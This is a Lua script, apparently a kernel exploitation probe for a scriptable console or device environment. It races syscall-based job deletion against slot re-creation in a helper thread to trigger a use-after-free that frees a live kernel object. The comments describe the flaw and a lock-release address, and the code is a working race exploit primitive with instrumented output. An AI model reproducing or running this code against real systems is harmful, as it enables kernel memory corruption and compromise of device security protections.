-- CRASH_CLASS: RISKY
-- PROBE 499d: instrumented slot recycle
-- The delete re-resolves the slot after releasing the table lock (0x3afe6c) and then
-- frees [sub+0x18] of whatever job it finds there. If a helper deletes the ids and
-- immediately creates new ones in the same slots, the parent's post-release lookup can
-- land on a brand new job and free a live object. Every step prints, so a stop is
-- attributable to the step that caused it.
print("=== PROBE 499d: instrumented slot recycle ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function addrnum(v)
    if type(v) == "table" then
        local h, l = v.h, v.l
        if type(h) == "number" and type(l) == "number" then return h * 4294967296 + l end
        if v.tonumber then local n = v:tonumber(); if type(n) == "number" then return n end end
        error("cannot convert address value")
    end
    return to_num(v)
end
local N, ITER = 8, 2
local data, out = memory.alloc(0x2000), memory.alloc(0x100)
local ids, ids2, st = memory.alloc(N * 4), memory.alloc(N * 4), memory.alloc(0x40)
local gate = memory.alloc(0x100)
local sc669, sc664, sc662 = make_syscall(669), make_syscall(664), make_syscall(662)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
local made = 0
for i = 0, N - 1 do
  for off = 0, 0xFF, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local ok = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
  local id = to_num(memory.read_dword(out))
  if ok and id > 0 then
    pcall(function() memory.write_dword(ids + i * 4, id) end)
    pcall(function() return sc664(uint64(ids + i * 4), uint64(1), uint64(st)) end)
    made = made + 1
  end
end
print(string.format("prepared %d", made))
if made < N then return end
for off = 0, 0xFF, 4 do pcall(function() memory.write_dword(gate + off, 0) end) end
local body = "local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end\n" ..
  "local c, p, d = mk(669), mk(664), mk(662)\n" ..
  "while memory.read_dword(GATE) == 0 do end\n" ..
  "memory.write_dword(GATE + 4, 1)\n" ..
  "for it = 1, ITER do\n" ..
  "  print('T: delete pass ' .. it)\n" ..
  "  pcall(function() d(IDS, N, ST) end)\n" ..
  "  print('T: deleted')\n" ..
  "  for i = 0, N - 1 do\n" ..
  "    pcall(function() memory.write_dword(OUT, 0) end)\n" ..
  "    local okc = pcall(function() c(1, DATA, 1, 1, OUT) end)\n" ..
  "    local nid = memory.read_dword(OUT)\n" ..
  "    if not okc or nid == 0 then print('T: create failed at ' .. i) else\n" ..
  "      memory.write_dword(IDS2 + i * 4, nid)\n" ..
  "      pcall(function() p(IDS2 + i * 4, 1, ST) end)\n" ..
  "    end\n" ..
  "  end\n" ..
  "  print('T: created ' .. ITER .. 'x' .. N)\n" ..
  "end\n" ..
  "memory.write_dword(GATE + 8, 1)\n" ..
  "print('T: done')\n"
for pat, val in pairs({ ["GATE"] = gate, ["IDS2"] = ids2, ["IDS"] = ids, ["ST"] = st,
                        ["OUT"] = out, ["DATA"] = data }) do
  body = body:gsub(pat, tostring(addrnum(val)))
end
body = body:gsub("ITER", tostring(ITER)):gsub("N", tostring(N))
print("spawning")
local ok, thr = pcall(run_lua_code_in_new_thread, body, { async = true })
if not ok or type(thr) ~= "table" then print("spawn failed"); return end
local spins = 0
while to_num(memory.read_dword(gate + 4)) == 0 and spins < 4000000 do spins = spins + 1 end
print("P: opening gate")
pcall(function() memory.write_dword(gate, 1) end)
for it = 1, ITER do
  print("P: delete pass " .. it)
  pcall(function() return sc662(uint64(ids), uint64(N), uint64(st)) end)
  local s = ""
  for i = 0, N - 1 do s = s .. string.format("%x ", to_num(memory.read_dword(st + i * 4))) end
  print("P: statuses " .. s)
end
local jspins = 0
while to_num(memory.read_dword(gate + 8)) == 0 and jspins < 4000000 do jspins = jspins + 1 end
print("P: helper finished")
pcall(function() return thr:join() end)
print("P: joined")
local good, bad = 0, 0
for i = 1, 8 do
  for off = 0, 0xFF, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local okc = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
  local id = to_num(memory.read_dword(out))
  if okc and id > 0 then
    pcall(function() memory.write_dword(ids2, id) end)
    pcall(function() return sc664(uint64(ids2), uint64(1), uint64(st)) end)
    pcall(function() return sc662(uint64(ids2), uint64(1), uint64(st)) end)
    if to_num(memory.read_dword(st)) == 0 then good = good + 1 else bad = bad + 1 end
  else
    bad = bad + 1
  end
end
print(string.format("health: clean=%d bad=%d", good, bad))
print("=== PROBE 499d COMPLETE ===")
